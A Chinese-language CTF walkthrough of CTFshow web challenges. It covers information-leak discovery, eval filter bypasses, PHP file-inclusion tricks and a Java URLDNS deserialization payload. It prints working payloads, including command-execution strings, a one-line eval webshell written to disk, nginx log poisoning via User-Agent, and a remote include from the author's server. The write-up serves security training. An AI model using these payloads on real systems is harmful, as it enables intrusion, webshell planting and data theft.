## **CTFshow**

### **信息收集**：

#### Web 1-5

- 查看网页源代码
- 抓个包看有没有藏东西
- 查看robots.txt
- phps源码泄露，访问index.phps，通过其源码泄露，在其中找到flag

#### Web6

网页提示下载源码查看，访问url/www.zip得到源码文件

解压文件我们得到

<img src="assets/202411102303478.png" alt="image-20241102003213997" style="zoom:200%;" />

打开fl00g.txt，没有我们想要的flag

打开index.php

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-01 14:37:13
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-01 14:42:44
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
//flag in fl000g.txt
echo "web6:where is flag?"
?>
```

显示flag in fl00g.txt

直接访问url/fl00g.txt得到flag

#### web7

git泄露，访问url/.git即可得到flag

#### web8

svn泄露，访问url/.git即可得到flag

#### web9

vim缓存信息泄露，访问url/index.php.swp，打开下载的index.php.swp即可得到flag

#### web10

根据hint查看cookie可以看到

> cookie:flag=ctfshow%7B3ac14c03-64d1-41aa-9328-c97bcceeb840%7D

进行url解码即可得到flag

![image-20241106010021516](assets/202411072207591.png)

#### web11

域名解析

我们可以通过nslookup来进行域名解析查询

```
nslookup -qt=格式 URL
```

```
nslookup -qt=any URL 
//遍历所有格式
```

```
nslookup -qt=TXT URL
//查询txt格式
```

#### web12

hint：有时候网站上的公开信息，就是管理员常用密码

先用dirsearch扫一下

![image-20241106092048352](assets/202411072207900.png)

访问admin，要求我们输入管理员账号密码，根据后台路径我们可以猜测账号为`admin`

回到主页，在网页的底部我们可以看到一个电话`Help Line Number : 372619038`

猜测电话为管理员密码，输入后成功得到flag

#### web13

在页面底部可以看到一个document

![image-20241106121019219](assets/202411072207995.png)

点击发现下载了一个document.pdf文件，文件里有后台的地址和账号密码

![image-20241106121415093](assets/202411072207016.png)d

登录后台即可得到flag

#### web14

根据hint知道editor处应该有信息泄漏(虽然不知道什么是editor)

我们先用dirsearch扫一下后台

<img src="assets/NUQB3oh7mj5ATvJ.png" alt="image-20241106202626586" style="zoom:50%;" />

访问url/editor

<img src="assets/UvozfSbVdp3xLPW.png" alt="image-20241106202742084" style="zoom: 50%;" />

是一个文字编辑的页面，我们可以发现在上传附件📎出可以调用出到服务器的文件管理器

在服务器的根目录没看到flag，尝试查看网站的根目录(var/www/html),看看有没有隐藏页面

发现nothinghere文件夹中有个fl00g.txt文件

访问url/nothinghere/f1000g.txt即可得到flag

#### web15

扫描到后台为url/admin，打开看到有个忘记密码，要求输入城市

![image-20241112203115743](./assets/image-20241112203115743.png)

![image-20241112203225217](./assets/image-20241112203225217.png)

根据hint我们可以在主页底部找到一个qq邮箱，查询一下qq号

<img src="./assets/image-20241112203325025.png" alt="image-20241112203325025" style="zoom:50%;" />

得到信息，现居陕西西安

输入西安成功重置密码，输入重置密码和帐号admin，成功得到flag

#### Web16

探针泄漏

dirsearch 扫描不到这个探针，看wp才知道的

探针在url/tz.php

访问探针

![image-20241112204025693](./assets/image-20241112204025693.png)

![image-20241112204437105](./assets/image-20241112204437105.png)

在指针里面可以找到phpinfo页面

打开在phpinfo里面可以找到flag

![](./assets/image-20241112204552383.png)

#### web17

sql备份泄漏

![image-20241112205219664](./assets/image-20241112205219664.png)

用dirsearch扫出来存在sql备份泄漏，下载backup.sql，打开得到flag

![image-20241112205527202](./assets/image-20241112205527202.png)

#### web18

本题是一个游戏，玩到101分就能得到flag

我们直接看js

Flappy_js.js

![image-20241113125910231](assets/image-20241113125910231.png)

审一下代码，我们可以看到当分数大于100的时候会输出这段文字，这段文字看着像unidcode编码，解码试试

![image-20241113130107163](assets/image-20241113130107163.png)

根据提示访问url/110.php,得到flag

#### web19

题目是一个登录的页面，根据hint查看网页源代码

![image-20241113132533968](assets/image-20241113132533968.png)

根据提示，这道题应该是一道对密码进行了加密的题目

审阅一下代码我们得到这些信息

> mode模式： CBC padding 填充方式： ZeroPadding
> 密文输出编码： 十六进制hex 偏移量iv: ilove36dverymuch 密钥：0000000372619038
> 密文为： a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04

[AES 加密/解密 - 锤子在线工具](https://www.toolhelper.cn/SymmetricEncryption/AES)

用解密工具解密一下密文我们可以得到密码为

![image-20241113133003036](assets/image-20241113133003036.png)

输入密码，得到flag

#### web20

> hint：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。

这是一个使用access数据库的asp程序

根据提示本题存在mdb文件泄露，那我们直接访问url/db/db.mdb

下载db.mdb文件后用记事本打开搜索flag，即可得到 flag{ctfshow_old_database}

![image-20241113134305246](assets/image-20241113134305246.png)

### **命令执行**：

#### web29

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:26:48
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。

进行绕过就行，解法很多

> 1. c=system("cat fl*g.php | grep  -E 'fl.g' ");
>
> 2. c=system("tac fl*g.php");
>
> 3. c=system("cat fl*g.php");（用cat要右键查看源代码才能看到回显）
>
> 4. c=system("cp fl*g.php a.txt ");（访问a.txt查看）
>
> 5. c=system('echo -e " <?php \n error_reporting(0); \n  \$c= \$_GET[\'c\']; \n eval(\$c); " > a.php'); //直接新建一个页面并写入一句话木马
>    （/a.php?c=system("tac flag.php");）
>
> 6. ?c=echo \`tac fla*\`;
>
>    ....

#### web30

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:42:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这里过滤了关键字flag，system还有php，由于过滤了system我们需要使用其他的系统函数进行命令执行

payload:

> 1. c=printf(exec("cat%20fl*"));
>
> 2. c=echo exec("cat f\lag.p\hp");
>
> 3. c=show_source(scandir(".")[2]); (这个函数会返回一个包含当前目录下所有文件和目录项的数组)
>
> 4. c=highlight_file(next(array_reverse(scandir("."))));
>
> 5. c=passthru("tac fla*");
>
> 6. c=echo \`tac fla*\`;
>
> 7. c=$a=sys;$b=tem;$c=$a.$b;$c("tac fla*");*
>
> 8. c=echo shell_exec("tac fla*");
>
> 9. c=eval($_GET[1]);&1=system("tac flag.php");
>
> 10. c=passthru(base64_decode("Y2F0IGZsYWcucGhw=="));(base64绕过)
>
>     ......

#### web31

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:10
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这题屏蔽了关键词 /flag|system|php|cat|sort|shell|\.| |\'

payload:

> 1. c=eval($_GET[1]);&1=system("tac flag.php");
> 2. c=show_source(scandir(getcwd())[2]);
> 3. c=show_source(next(array_reverse(scandir(pos(localeconv())))));
> 4. c=passthru("tac%09fla*");
> 5. c=echo\`tac%09fla*\`;

#### web32

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:56:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这题屏蔽了关键词 /flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(

*过滤了空格可以用`${IFS}`和`%0a` 代替，分号可以用`?>`代替*

用include构造payload：

> url/?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
>
> 或者
>
> url/?c=include$_GET[1]?>&1=data://text/plain,<?php%20system("tac%20flag.php")?>

得到的结果用base64解码一下就可以得到flag了

或者用日志注入：

> url/?c=include$_GET[1]?%3E&1=../../../../var/log/nginx/access.log
> `/var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可`

#### web33

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 02:22:27
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
//
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

屏蔽的关键词比上一题多了个双引号 /flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"

继续使用include构造payload：

> url/?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
>
> 或者
>
> url/?c=include$_GET[1]?>&1=data://text/plain,<?php%20system("tac%20flag.php")?>

#### web34

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

屏蔽的关键词 /flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"

继续使用include构造payload：

> url/?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
>
> 或者
>
> url/?c=include$_GET[1]?>&1=data://text/plain,<?php%20system("tac%20flag.php")?>

#### web35

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

屏蔽关键词 /flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=

继续使用include构造payload：（wsm还能秒）

> url/?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
>
> 或者
>
> url/?c=include$_GET[1]?>&1=data://text/plain,<?php%20system("tac%20flag.php")?>

#### web36

```php
<?php

/*
\# -*- coding: utf-8 -*-
\# @Author: h1xa
\# @Date:  2020-09-04 00:12:34
\# @Last Modified by:  h1xa
\# @Last Modified time: 2020-09-04 04:21:16
\# @email: h1xa@ctfer.com
\# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
  $c = $_GET['c'];
  if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
    eval($c);
  }
  
}else{
  highlight_file(__FILE__);
}
```

屏蔽关键字 /flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]

不是哥们，数字也要屏蔽，那我改一下不就好了

继续使用include构造payload：

> url/?c=include$_GET[m]?>&m=php://filter/convert.base64-encode/resource=flag.php
>
> 或者
>
> url/?c=include$_GET[m]?>&m=data://text/plain,<?php%20system("tac%20flag.php")?>

#### web37

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:18:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

不是哥们，怎么还是文件包含

payload：

> ?c=data://text/plain,<?php system("tac fla*.php")?>
>
> 或者
>
> ?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=

#### web38

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:23:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

payload:

> ?c=data://text/plain,<?=system("tac%20fla*")?>
>
> 或者
>
> ?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=

#### web39

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:13:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

这里会在我们传入的c后面拼接一段.php

我们只需要在加入<?php ?>那么php就只会执行中间的代码，后面的内容不会执行

故payload：

> ?c=data://text/plain,<?php system("tac fla*.php")?>

#### web40

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

屏蔽关键词 /[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\

这里要使用无参命令执行

payload：

> ?c=show_source(next(array_reverse(scandir(pos(localeconv())))));

关于无参命令执行的一些解释

![image-20241109165447576](assets/202411091654772.png)

### **文件包含**

> 以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()

#### Web78

php伪协议

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 10:52:43
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 10:54:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
```

payload:

> ?file=data://text/plain,<?php system("cat flag.php")?>

查看源代码，得到flag

![image-20241121192438056](./assets/image-20241121192438056.png)

#### web79

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:10:14
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:12:38
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

这题相对于上一题会将file中的php替换为???

我们可以通过base64进行绕过

```
?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
```

or

```
?file=data://text/plain,<?=system('tac flag*');?> 

?file=data://text/plain,<?Php echo `tac f*`;?>
```

or

远程加载

> 加载robots.txt，发现可以回显
>
> 在自己vps上创建1.txt，内容如下 `<?php system("tac flag.php");?>` 
>
> 起一个http服务，加载 `url/?file=http://x.x.x.x:7001/1.txt`

or

input协议 大小写绕过

payload: 

```
POST /?file=Php://input HTTP/1.1

<?Php system("cat flag.php");?>
```

#### web80

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:26:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

data协议被ban了

可以用日志注入

```
GET /?file=/var/log/nginx/access.log HTTP/1.1
Host: 4e9bb3c0-1021-427e-81a3-42e5e6e13c39.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0<?php eval($_GET[2]);?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c
Connection: close
```

写入一句话木马

![image-20241121201547420](./assets/image-20241121201547420.png)

连webshell工具或者直接get传参

```
?file=/var/log/nginx/access.log&2=system('ls /var/www/html');phpinfo();

?file=/var/log/nginx/access.log&2=system('tac /var/www/html/fl0g.php');phpinfo();
```

Or

input协议 大小写绕过

payload: 

```
POST /?file=Php://input HTTP/1.1

<?Php system("cat flag.php");?>
```

#### ![image-20241121202826975](./assets/image-20241121202826975.png)

#### web81

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 15:51:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

：被ban了

用不了上题的input，但是还是可以用日志注入的

写入木马

![image-20241121203836225](./assets/image-20241121203836225.png)

查flag

![image-20241121204644174](./assets/image-20241121204644174.png)

#### Web82



### **Java反序列化：**

#### web846

URLDNS

payload：

```java
import java.io. *;
import java.lang.reflect.Field;
import java.util.*;
import java.net.URL;
import java.util.HashMap;


public class URLDNS {
    public static void serialize(Object obj) throws IOException{
        ByteArrayOutputStream data =new ByteArrayOutputStream();
        ObjectOutput oos =new ObjectOutputStream(data);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));
    };
    public static void main(String[] args) throws Exception{
        HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
        URL url = new URL("https://78c78067-c876-40fb-b175-edb3b743655d.challenge.ctf.show/");
        Class c = url.getClass();
        Field hashcodefield = c.getDeclaredField("hashCode");
        hashcodefield.setAccessible(true);
//          不想这里发起请求，把url对象的hashcode改成不是-1
        hashcodefield.set(url,911);
        hashmap.put(url,1);
        hashcodefield.set(url,-1);
//          这里把hashcode改回-1

        serialize(hashmap);
    }
}
```

